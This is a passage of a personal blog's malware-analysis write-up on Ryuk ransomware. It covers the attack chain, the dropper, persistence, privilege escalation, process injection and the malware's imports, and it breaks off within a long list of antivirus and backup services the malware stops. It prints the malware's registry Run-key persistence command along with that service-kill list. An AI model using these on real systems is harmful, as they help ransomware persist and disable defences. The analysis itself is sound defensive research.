<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Deep Analysis of Ryuk Ransomware - Zakariae el bouzarazi</title>
<meta name="description" content="Ryuk has been know to be a part of a bigger “Triple Threat” attack that involves Emotet and TrickBot. The first stage of this attack is the delivery of Emotet through phishing emails that contain a weaponized word document, this document contains a macro code that downloads Emotet… ">


  <meta name="author" content="Zakariae El bouzarazi">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zakariae el bouzarazi">
<meta property="og:title" content="Deep Analysis of Ryuk Ransomware">
<meta property="og:url" content="https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/ryuk-ransomware/">


  <meta property="og:description" content="Ryuk has been know to be a part of a bigger “Triple Threat” attack that involves Emotet and TrickBot. The first stage of this attack is the delivery of Emotet through phishing emails that contain a weaponized word document, this document contains a macro code that downloads Emotet… ">



  <meta property="og:image" content="https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/malware-analysis/ryuk-ransomware/logo.png">





  <meta property="article:published_time" content="2020-05-05T00:00:00+01:00">





  

  


<link rel="canonical" href="https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/ryuk-ransomware/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "zakariae Elbouzarazi",
      "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/"
    
  }
</script>


  <meta name="google-site-verification" content="J3MnMF94zaZhTUoNtUiRt9cKsr7hiMyTxEdAvQ3GfmY" />





<!-- end _includes/seo.html -->


<link href="/pages/elbouzarazi/feed.xml" type="application/atom+xml" rel="alternate" title="Zakariae el bouzarazi Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/pages/elbouzarazi/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/pages/elbouzarazi/"><img src="/pages/elbouzarazi/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/pages/elbouzarazi/">
          Zakariae el bouzarazi
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories/#malware-analysis">Malware Analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories/#binary-exploitation">Binary Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories/#ctf-writeups">CTF Writeups</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories/#tutorials">Tutorials</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/pages/elbouzarazi/assets/images/site_data/avatar.jpg" alt="Zakariae El bouzarazi" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zakariae El bouzarazi</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Malware Analysis &amp; Reverse Engineering Adventures.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="zekuelbouzrazi@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/_n1ghtw0lf" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zakariae-elbouzarazi-34126b293/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/elbouzarazi" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Deep Analysis of Ryuk Ransomware">
    <meta itemprop="description" content="Introduction">
    <meta itemprop="datePublished" content="2020-05-05T00:00:00+01:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Deep Analysis of Ryuk Ransomware
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  13 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a>
    <ul>
      <li><a href="#attack-chain">Attack Chain</a></li>
      <li><a href="#ryuk-overview">Ryuk overview</a></li>
    </ul>
  </li>
  <li><a href="#first-stage-the-dropper">First Stage (The Dropper)</a></li>
  <li><a href="#second-stage">Second Stage</a>
    <ul>
      <li><a href="#deleting-the-dropper">Deleting The Dropper</a></li>
      <li><a href="#persistence">Persistence</a></li>
      <li><a href="#privilege-escalation">Privilege Escalation</a></li>
      <li><a href="#process-injection">Process Injection</a></li>
      <li><a href="#building-imports">Building Imports</a></li>
      <li><a href="#killing-processes">Killing Processes</a></li>
      <li><a href="#deleting-backups">Deleting Backups</a></li>
      <li><a href="#the-encryption-process">The Encryption Process</a></li>
      <li><a href="#encrypting-network-shares">Encrypting Network Shares</a></li>
      <li><a href="#iocs">IOCs</a></li>
      <li><a href="#yara-rule">Yara Rule</a></li>
      <li><a href="#external-references">External References</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <h1 id="introduction"><u>Introduction</u></h1>

<h2 id="attack-chain">Attack Chain</h2>

<p>Ryuk has been know to be a part of a bigger <code class="language-plaintext highlighter-rouge">"Triple Threat"</code> attack that involves <code class="language-plaintext highlighter-rouge">Emotet</code> and <code class="language-plaintext highlighter-rouge">TrickBot</code>.</p>

<p>The first stage of this attack is the delivery of Emotet through phishing emails that contain a weaponized word document, this document contains a macro code that downloads Emotet.</p>

<p>Once Emotet executes, it downloads another malware (usually TrickBot)  which can collect system information, steal credentials, disable AV, do lateral movement, …</p>

<p>The third stage of the attack is to connect to the <code class="language-plaintext highlighter-rouge">C&amp;C</code> server to download <code class="language-plaintext highlighter-rouge">Ryuk</code> which makes use of the lateral movement done by <code class="language-plaintext highlighter-rouge">TrickBot</code> to infect and encrypt as many systems on the network as possible.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/1.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/1.png" alt="1" /></a></p>

<h2 id="ryuk-overview">Ryuk overview</h2>

<p>I will give a brief overview of how Ryuk operates then I will go into details in the upcoming sections.</p>

<p>Ryuk operates in two stages. The first stage is a dropper that drops the real Ryuk ransomware at another directory and exits. Then the ransomware tries to injects running processes to avoid detection. We can also see that it launches a <code class="language-plaintext highlighter-rouge">cmd.exe</code> process to modify the registry.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/2.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/2.png" alt="2" /></a></p>

<p>After that, Ryuk goes through encrypting the system files and network shares, it drops a <code class="language-plaintext highlighter-rouge">"Ransom Note"</code> at every folder it encrypts under the name <code class="language-plaintext highlighter-rouge">RyukReadMe.txt</code>.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/3.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/3.png" alt="3" /></a></p>

<p>Enough introduction, let’s dive into Ryuk.</p>

<h1 id="first-stage-the-dropper"><u>First Stage (The Dropper)</u></h1>

<p><code class="language-plaintext highlighter-rouge">SHA256: 23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2</code></p>

<p>The dropper first checks the windows <code class="language-plaintext highlighter-rouge">MajorVersion</code> and if it’s equal to 5 <code class="language-plaintext highlighter-rouge">(windows 2000 | windows XP | Windows Server 2003)</code>, it drops the ransomware executable at <code class="language-plaintext highlighter-rouge">C:\Documents and Settings\Default User\</code> , otherwise it drops it at <code class="language-plaintext highlighter-rouge">C:\users\Public\</code>.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/4.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/4.png" alt="4" /></a></p>

<p>The name of the dropped executable is five randomly generated characters.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/5.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/5.png" alt="5" /></a></p>

<p>If the creation of this file failed, Ryuk drops the executable at the same directory of the dropper with replacing the last character of its name with the letter ‘V’ (If the dropper name is <code class="language-plaintext highlighter-rouge">ryuk.exe</code>, the dropped executable will be <code class="language-plaintext highlighter-rouge">ryuV.exe</code>).</p>

<p>Next we can see a call to <code class="language-plaintext highlighter-rouge">IsWow64Process()</code> and if it returns <code class="language-plaintext highlighter-rouge">true</code> (which means Ryuk is running at a 64 bit system), it writes the 64 bit binary to the dropped executable, else it writes the 32 bit binary. The 2 binary files are stored at the <code class="language-plaintext highlighter-rouge">.data</code> section.</p>

<p>The last step is a call to <code class="language-plaintext highlighter-rouge">ShellExecuteW()</code> to execute the second stage executable with passing it one argument which is the dropper path (This is used later to delete the dropper).</p>

<table>
  <tbody>
    <tr>
      <td><a href="/assets/images/malware-analysis/ryuk-ransomware/6.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/6.png" alt="6" /></a></td>
      <td><a href="/assets/images/malware-analysis/ryuk-ransomware/7.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/7.png" alt="7" /></a></td>
    </tr>
  </tbody>
</table>

<h1 id="second-stage"><u>Second Stage</u></h1>

<p><code class="language-plaintext highlighter-rouge">SHA256: 8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7d</code></p>

<h2 id="deleting-the-dropper">Deleting The Dropper</h2>

<p>Before the dropper exits, it passes its path to the second stage executable as a command line argument which in turn deletes the dropper.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/8.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/8.png" alt="8" /></a></p>

<h2 id="persistence">Persistence</h2>

<p>Ryuk uses the very well know registry key to achieve persistence, It creates a new value under the name  <code class="language-plaintext highlighter-rouge">"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\svchos"</code> and its data is set to the executable path which in my case is <code class="language-plaintext highlighter-rouge">"C:\users\Public\BPWPc.exe"</code>.</p>

<p>Here is the full command:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/C</span><span class="w"> </span><span class="nx">REG</span><span class="w"> </span><span class="nx">ADD</span><span class="w"> </span><span class="s2">"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"svchos"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="s2">"C:\users\Public\BPWPc.exe"</span><span class="w"> </span><span class="nx">/f</span><span class="w">
</span></code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<p>Ryuk uses <code class="language-plaintext highlighter-rouge">AdjustTokenPrivileges()</code> function to adjust its process security access token. The requested privilege name is <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> and according to Microsoft docs:</p>

<blockquote>
  <p>SeDebugPrivilege:</p>

  <p>Required to debug and adjust the memory of a process owned by another account.
With this privilege, the user can attach a debugger to any process or to the kernel.</p>
</blockquote>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/9.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/9.png" alt="9" /></a></p>

<p>This method is usually used by malware to perform process injection (which is done next).</p>

<h2 id="process-injection">Process Injection</h2>

<p>Ryuk goes through all running processes and stores <code class="language-plaintext highlighter-rouge">(ProcessName, ProcessID, ProcessType)</code> in a big array, <code class="language-plaintext highlighter-rouge">ProcessType</code> is an integer that is set to <code class="language-plaintext highlighter-rouge">1</code> If the domain name of the user of the process starts with “NT A” (which is “NT AUTHORITY”), otherwise the <code class="language-plaintext highlighter-rouge">ProcessType</code> is set to 2.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/10.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/10.png" alt="10" /></a></p>

<p>To make it easier, I created a structure in IDA called <code class="language-plaintext highlighter-rouge">ProcessInfo</code>.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/11.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/11.png" alt="11" /></a></p>

<p>After that, Ryuk loops through the processes’ stored data to perform the process injection.</p>

<p>If the process name is <code class="language-plaintext highlighter-rouge">(csrss.exe | explorer.exe | lsaas.exe)</code>, Ryuk ignores that process.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/12.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/12.png" alt="12" /></a></p>

<p>The process injection technique used here is very simple, Ryuk allocates memory for its process at the target process memory space using <code class="language-plaintext highlighter-rouge">VirtualAllocEx()</code>, then it writes its process to that allocated memory using <code class="language-plaintext highlighter-rouge">WriteProcessMemory()</code>. Finally it creates a new thread using <code class="language-plaintext highlighter-rouge">CreateRemoteThread()</code> to run Ryuk’s thread at the injected process.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/13.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/13.png" alt="13" /></a></p>

<h2 id="building-imports">Building Imports</h2>

<p>Ryuk imports its necessary functions dynamically using <code class="language-plaintext highlighter-rouge">LoadLibraryA()</code> and <code class="language-plaintext highlighter-rouge">GetProcAdress()</code>. The names of the imported functions are obfuscated so static analysis won’t do very well here.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/14.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/14.png" alt="14" /></a></p>

<p>We can use a debugger to get these names rather than reversing the obfuscation algorithm.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/15.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/15.png" alt="15" /></a></p>

<p>Here is the list of imported functions:</p>

<details style="color: #EEFFFF; font-family: monospace !default; font-size: 0.85em; background: #263238; border: 1px solid #263238; border-radius: 3px; padding: 10px; line-height: 1.8">
    <summary style="outline: none; cursor: pointer">
        <span style="color: darkgray">
            Expand to see more
        </span><br />
&emsp; advapi32.dll<br />
&emsp; &emsp; &ensp; CryptAcquireContextW<br />
&emsp; &emsp; &ensp; CryptDecrypt<br />
&emsp; &emsp; &ensp; CryptDeriveKey<br />
&emsp; &emsp; &ensp; CryptDestroyKey<br />
&emsp; &emsp; &ensp; CryptEncrypt<br />
&emsp; &emsp; &ensp; CryptExportKey<br />
&emsp; &emsp; &ensp; CryptGenKey<br />
&emsp; &emsp; &ensp; CryptImportKey<br />
</summary>
&emsp; &emsp; &ensp; GetUserNameA<br />
&emsp; &emsp; &ensp; GetUserNameW<br />
&emsp; &emsp; &ensp; RegCloseKey<br />
&emsp; &emsp; &ensp; RegDeleteValueW<br />
&emsp; &emsp; &ensp; RegOpenKeyExA<br />
&emsp; &emsp; &ensp; RegOpenKeyExW<br />
&emsp; &emsp; &ensp; RegQueryValueExA<br />
&emsp; &emsp; &ensp; RegSetValueExW<br />
&emsp; kernel32.dll<br />
&emsp; &emsp; &ensp; CloseHandle<br />
&emsp; &emsp; &ensp; CopyFileA<br />
&emsp; &emsp; &ensp; CopyFileW<br />
&emsp; &emsp; &ensp; CreateDirectoryW<br />
&emsp; &emsp; &ensp; CreateFileA<br />
&emsp; &emsp; &ensp; CreateFileW<br />
&emsp; &emsp; &ensp; CreateProcessA<br />
&emsp; &emsp; &ensp; CreateProcessW<br />
&emsp; &emsp; &ensp; DeleteFileW<br />
&emsp; &emsp; &ensp; ExitProcess<br />
&emsp; &emsp; &ensp; FindClose<br />
&emsp; &emsp; &ensp; FindFirstFileW<br />
&emsp; &emsp; &ensp; FindNextFileW<br />
&emsp; &emsp; &ensp; FreeLibrary<br />
&emsp; &emsp; &ensp; GetCommandLineW<br />
&emsp; &emsp; &ensp; GetCurrentProcess<br />
&emsp; &emsp; &ensp; GetDriveTypeW<br />
&emsp; &emsp; &ensp; GetFileAttributesA<br />
&emsp; &emsp; &ensp; GetFileAttributesW<br />
&emsp; &emsp; &ensp; GetFileSize<br />
&emsp; &emsp; &ensp; GetLogicalDrives<br />
&emsp; &emsp; &ensp; GetModuleFileNameA<br />
&emsp; &emsp; &ensp; GetModuleFileNameW<br />
&emsp; &emsp; &ensp; GetModuleHandleA<br />
&emsp; &emsp; &ensp; GetStartupInfoW<br />
&emsp; &emsp; &ensp; GetTickCount<br />
&emsp; &emsp; &ensp; GetVersionExW<br />
&emsp; &emsp; &ensp; GetWindowsDirectoryW<br />
&emsp; &emsp; &ensp; GlobalAlloc<br />
&emsp; &emsp; &ensp; LoadLibraryA<br />
&emsp; &emsp; &ensp; ReadFile<br />
&emsp; &emsp; &ensp; SetFileAttributesA<br />
&emsp; &emsp; &ensp; SetFileAttributesW<br />
&emsp; &emsp; &ensp; SetFilePointer<br />
&emsp; &emsp; &ensp; Sleep<br />
&emsp; &emsp; &ensp; VirtualAlloc<br />
&emsp; &emsp; &ensp; VirtualFree<br />
&emsp; &emsp; &ensp; WinExec<br />
&emsp; &emsp; &ensp; Wow64DisableWow64FsRedirection<br />
&emsp; &emsp; &ensp; Wow64RevertWow64FsRedirection<br />
&emsp; &emsp; &ensp; WriteFile<br />
&emsp; ole32.dll<br />
&emsp; &emsp; &ensp; CoCreateInstance<br />
&emsp; &emsp; &ensp; CoInitialize<br />
&emsp; Shell32.dll<br />
&emsp; &emsp; &ensp; ShellExecuteA<br />
&emsp; &emsp; &ensp; ShellExecuteW<br />
&emsp; mpr.dll<br />
&emsp; &emsp; &ensp; WNetCloseEnum<br />
&emsp; &emsp; &ensp; WNetEnumResourceW<br />
&emsp; &emsp; &ensp; WNetOpenEnumW<br />
&emsp; Iphlpapi.dll<br />
&emsp; &emsp; &ensp; GetIpNetTable<br />
</details>

<h2 id="killing-processes">Killing Processes</h2>

<p>Ryuk has a long list of predefined services and processes to kill using <code class="language-plaintext highlighter-rouge">net stop</code> and <code class="language-plaintext highlighter-rouge">taskkill /IM</code> respectively.</p>

<p>Here is the list of services:</p>

<details style="color: #EEFFFF; font-family: monospace !default; font-size: 0.85em; background: #263238; border: 1px solid #263238; border-radius: 3px; padding: 10px; line-height: 1.8;">
    <summary style="outline: none; cursor: pointer">
        <span style="color: darkgray">
            Expand to see more
        </span><br />
        &emsp; &emsp; Acronis VSS Provider <br />
        &emsp; &emsp; Enterprise Client Service <br />
        &emsp; &emsp; Sophos Agent <br />
        &emsp; &emsp; Sophos AutoUpdate Service <br />
        &emsp; &emsp; Sophos Clean Service <br />
        &emsp; &emsp; Sophos Device Control Service <br />
        &emsp; &emsp; Sophos File Scanner Service <br />
        &emsp; &emsp; Sophos Health Service <br />
        &emsp; &emsp; Sophos MCS Agent <br />
        &emsp; &emsp; Sophos MCS Client <br />
 </summary>
		&emsp; &emsp; Sophos Message Router <br />
        &emsp; &emsp; Sophos Safestore Service <br />
        &emsp; &emsp; Sophos System Protection Service <br />
        &emsp; &emsp; Sophos Web Control Service <br />
        &emsp; &emsp; SQLsafe Backup Service <br />
        &emsp; &emsp; SQLsafe Filter Service <br />
        &emsp; &emsp; Symantec System Recovery <br />
        &emsp; &emsp; Veeam Backup Catalog Data Service <br />
        &emsp; &emsp; AcronisAgent <br />
        &emsp; &emsp; AcrSch2Svc <br />
        &emsp; &emsp; Antivirus <br />
        &emsp; &emsp; ARSM <br />
        &emsp; &emsp; BackupExecAgentAccelerator <br />
        &emsp; &emsp; BackupExecAgentBrowser <br />
        &emsp; &emsp; BackupExecDeviceMediaService <br />
        &emsp; &emsp; BackupExecJobEngine <br />
        &emsp; &emsp; BackupExecManagementService <br />
        &emsp; &emsp; BackupExecRPCService <br />
        &emsp; &emsp; BackupExecVSSProvider <br />
        &emsp; &emsp; bedbg <br />
        &emsp; &emsp; DCAgent <br />
        &emsp; &emsp; EPSecurityService <br />
        &emsp; &emsp; EPUpdateService <br />
        &emsp; &emsp; EraserSvc11710 <br />
        &emsp; &emsp; EsgShKernel <br />
        &emsp; &emsp; FA_Scheduler <br />
        &emsp; &emsp; IISAdmin <br />
        &emsp; &emsp; IMAP4Svc <br />
        &emsp; &emsp; macmnsvc <br />
        &emsp; &emsp; masvc <br />
        &emsp; &emsp; MBAMService <br />
        &emsp; &emsp; MBEndpointAgent <br />
        &emsp; &emsp; McAfeeEngineService <br />
        &emsp; &emsp; McAfeeFramework <br />
        &emsp; &emsp; McAfeeFrameworkMcAfeeFramework <br />
        &emsp; &emsp; McShield <br />
        &emsp; &emsp; McTaskManager <br />
        &emsp; &emsp; mfemms <br />
        &emsp; &emsp; mfevtp <br />
        &emsp; &emsp; MMS <br />
        &emsp; &emsp; mozyprobackup <br />
        &emsp; &emsp; MsDtsServer <br />
        &emsp; &emsp; MsDtsServer100 <br />
        &emsp; &emsp; MsDtsServer110 <br />
        &emsp; &emsp; MSExchangeES <br />
        &emsp; &emsp; MSExchangeIS <br />
        &emsp; &emsp; MSExchangeMGMT <br />
        &emsp; &emsp; MSExchangeMTA <br />
        &emsp; &emsp; MSExchangeSA <br />
        &emsp; &emsp; MSExchangeSRS <br />
        &emsp; &emsp; MSOLAP$SQL_2008 <br />
        &emsp; &emsp; MSOLAP$SYSTEM_BGC <br />
        &emsp; &emsp; MSOLAP$TPS <br />
        &emsp; &emsp; MSOLAP$TPSAMA <br />
        &emsp; &emsp; MSSQL$BKUPEXEC <br />
        &emsp; &emsp; MSSQL$ECWDB2 <br />
        &emsp; &emsp; MSSQL$PRACTICEMGT <br />
        &emsp; &emsp; MSSQL$PRACTTICEBGC <br />
        &emsp; &emsp; MSSQL$PROFXENGAGEMENT <br />
        &emsp; &emsp; MSSQL$SBSMONITORING <br />
        &emsp; &emsp; MSSQL$SHAREPOINT <br />
        &emsp; &emsp; MSSQL$SQL_2008 <br />
        &emsp; &emsp; MSSQL$SYSTEM_BGC <br />
        &emsp; &emsp; MSSQL$TPS <br />
        &emsp; &emsp; MSSQL$TPSAMA <br />
        &emsp; &emsp; MSSQL$VEEAMSQL2008R2 <br />
        &emsp; &emsp; MSSQL$VEEAMSQL2012 <br />
        &emsp; &emsp; MSSQLFDLauncher <br />
        &emsp; &emsp; MSSQLFDLauncher$PROFXENGAGEMENT <br />
        &emsp; &emsp; MSSQLFDLauncher$SBSMONITORING <br />
        &emsp; &emsp; MSSQLFDLauncher$SHAREPOINT <br />
        &emsp; &emsp; MSSQLFDLauncher$SQL_2008 <br />
        &emsp; &emsp; MSSQLFDLauncher$SYSTEM_BGC <br />
        &emsp; &emsp; MSSQLFDLauncher$TPS <br />
        &emsp; &emsp; MSSQLFDLauncher$TPSAMA <br />
        &emsp; &emsp; MSSQLSERVER <br />
        &emsp; &emsp; MSSQLServerADHelper100 <br />
        &emsp; &emsp; MSSQLServerOLAPService <br />
        &emsp; &emsp; MySQL80 <br />
        &emsp; &emsp; MySQL57 <br />
        &emsp; &emsp; ntrtscan <br />
        &emsp; &emsp; OracleClientCache80 <br />
        &emsp; &emsp; PDVFSService <br />
        &emsp; &emsp; POP3Svc <br />
        &emsp; &emsp; ReportServer <br />
        &emsp; &emsp; ReportServer$SQL_2008 <br />
        &emsp; &emsp; ReportServer$SYSTEM_BGC <br />
        &emsp; &emsp; ReportServer$TPS <br />
        &emsp; &emsp; ReportServer$TPSAMA <br />
        &emsp; &emsp; RESvc <br />
        &emsp; &emsp; sacsvr <br />
        &emsp; &emsp; SamSs <br />
        &emsp; &emsp; SAVAdminService <br />
        &emsp; &emsp; SAVService <br />
        &emsp; &emsp; SDRSVC <br />
        &emsp; &emsp; SepMasterService <br />
        &emsp; &emsp; ShMonitor <br />
        &emsp; &emsp; Smcinst <br />
        &emsp; &emsp; SmcService <br />
        &emsp; &emsp; SMTPSvc <br />
        &emsp; &emsp; SNAC <br />
        &emsp; &emsp; SntpService <br />
        &emsp; &emsp; sophossps <br />
        &emsp; &emsp; SQLAgent$BKUPEXEC <br />
        &emsp; &emsp; SQLAgent$ECWDB2 <br />
        &emsp; &emsp; SQLAgent$PRACTTICEBGC <br />
        &emsp; &emsp; SQLAgent$PRACTTICEMGT <br />
        &emsp; &emsp; SQLAgent$PROFXENGAGEMENT <br />
        &emsp; &emsp; SQLAgent$SBSMONITORING <br />
        &emsp; &emsp; SQLAgent$SHAREPOINT <br />
        &emsp; &emsp; SQLAgent$SQL_2008 <br />
        &emsp; &emsp; SQLAgent$SYSTEM_BGC <br />
        &emsp; &emsp; SQLAgent$TPS <br />
        &emsp; &emsp; SQLAgent$TPSAMA <br />
        &emsp; &emsp; SQLAgent$VEEAMSQL2008R2 <br />
        &emsp; &emsp; SQLAgent$VEEAMSQL2012 <br />
        &emsp; &emsp; SQLBrowser <br />
        &emsp; &emsp; SQLSafeOLRService <br />
        &emsp; &emsp; SQLSERVERAGENT <br />
        &emsp; &emsp; SQLTELEMETRY <br />
        &emsp; &emsp; SQLTELEMETRY$ECWDB2 <br />
        &emsp; &emsp; SQLWriter <br />
        &emsp; &emsp; SstpSvc <br />
        &emsp; &emsp; svcGenericHost <br />
        &emsp; &emsp; swi_filter <br />
        &emsp; &emsp; swi_service <br />
        &emsp; &emsp; swi_update_64 <br />
        &emsp; &emsp; TmCCSF <br />
        &emsp; &emsp; tmlisten <br />
        &emsp; &emsp; TrueKey <br />
        &emsp; &emsp; TrueKeyScheduler <br />
        &emsp; &emsp; TrueKeyServiceHelper <br />
        &emsp; &emsp; UI0Detect <br />
        &emsp; &emsp; VeeamBackupSvc <br />
        &emsp; &emsp; VeeamBrokerSvc <br />
        &emsp; &emsp; VeeamCatalogSvc <br />
        &emsp; &emsp; VeeamCloudSvc <br />
        &emsp; &emsp; VeeamDeploymentService <br />
        &emsp; &emsp; VeeamDeploySvc <br />
        &emsp; &emsp; VeeamEnterpriseManagerSvc <br />
        &emsp; &emsp; VeeamMountSvc <br />
        &emsp; &emsp; VeeamNFSSvc <br />
        &emsp; &emsp; VeeamRESTSvc <br />
        &emsp; &emsp; VeeamTransportSvc <br />
        &emsp; &emsp; W3Svc <br />
        &emsp; &emsp; wbengine <br />
        &emsp; &emsp; WRSVC <br />
        &emsp; &emsp; MSSQL$VEEAMSQL2008R2 <br />
